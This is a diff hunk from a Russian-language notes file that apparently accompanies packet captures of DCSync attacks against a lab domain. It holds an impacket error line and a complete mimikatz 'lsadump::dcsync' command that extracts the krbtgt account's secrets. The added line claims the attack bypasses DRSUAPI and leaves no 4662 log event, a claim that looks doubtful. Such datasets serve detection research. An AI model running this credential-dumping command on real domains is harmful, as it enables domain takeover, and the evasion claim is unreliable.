@@ -157,7 +157,7 @@ impacket.dcerpc.v5.drsuapi.DCERPCSessionError: DRSR SessionError: code: 0x20f7 -
 <img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/e0511b21-bf99-487f-9cde-67ba81d6bcd2" />
 
 # dcsync_rpc_success.pcapng
-Файл был получен используя утилиту mimikatz под УЗ system. 
+Файл был получен используя утилиту mimikatz под УЗ system. При подобной технике, не используется интерфейс DRSUAPI и при успешной атаке в журналах нет события 4662
 ### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
 Результат выполнения команды:
 
